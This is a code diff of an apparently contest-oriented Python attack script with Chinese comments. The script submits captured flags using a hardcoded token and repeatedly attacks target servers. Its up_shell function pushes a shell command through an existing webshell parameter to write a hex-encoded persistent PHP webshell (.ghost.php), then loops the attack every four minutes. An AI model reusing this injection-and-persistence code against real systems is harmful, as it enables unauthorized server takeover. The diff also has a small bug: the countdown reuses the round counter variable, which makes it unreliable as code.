@@ -29,6 +29,7 @@ def submit(ip, flag_text):  # 提交flag
         submit_header = {
             "Content-Type": "application/json;charset=utf-8",
             "Authorization": "1b1fae078083811a61e7794e8320755b",
+            "Connection": "close"
         }
         # json格式化flag
         submit_data = json.dumps({"flag": flag_text})
@@ -89,8 +90,8 @@ def up_shell(ip, url_path, method, passwd):  # 上传不死马
         # .ghost.php做hex转化
         # 参数[a]  进行写入不死马
         shell_hex = hex_shell()  # 获取不死马hex字符串
-        shell_str = "system('echo" + shell_hex + \
-            "|xxd -r -ps > .ghost.php');"  # 构造payload
+        # shell_str = "system('echo" + shell_hex + "|xxd -r -ps > .ghost.php');"  # 构造payload
+        shell_str = "echo" + shell_hex + "|xxd -r -ps > .ghost.php"  # 构造payload
         try:
             if method == 'get':
                 data = {passwd: shell_str}
@@ -108,7 +109,8 @@ def up_shell(ip, url_path, method, passwd):  # 上传不死马
                   ip + ' --> up_udshell()执行失败 --> ' + url)
             return False
         else:
-            print('\033[0;32m[上传木马成功]\033[0m'+ip+' --> webshell地址 --> '+shell_url)
+            print('\033[0;32m[上传木马成功]\033[0m'+ip +
+                  ' --> webshell地址 --> '+shell_url)
             return shell_url
 ##########################################################################################
 
@@ -145,14 +147,20 @@ def main():
                     submit(ip, flag)
 
 
+##########################################################################################
 if __name__ == '__main__':
+    i = 0
     try:
         while 1:
+            i += 1
             print("\033[1;33m[开始本轮攻击]\033[0m" +
-                  time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())+' -->')
+                  time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())+' --> '+str(i))
             main()
             print("\033[1;33m[本轮攻击结束]\033[0m" +
-                  time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())+' -->')
-            time.sleep(60*4)
+                  time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())+' --> '+str(i))
+            # time.sleep(60*4)
+            for i in range(240, 0, -1):
+                print("\r", "下轮攻击倒计时{}秒！".format(i), end="", flush=True)
+                time.sleep(1)
     except Exception as e:
         print('\033[1;35m[主函数执行异常]\033[0m' + ' --> main()执行异常 --> ' + str(e))
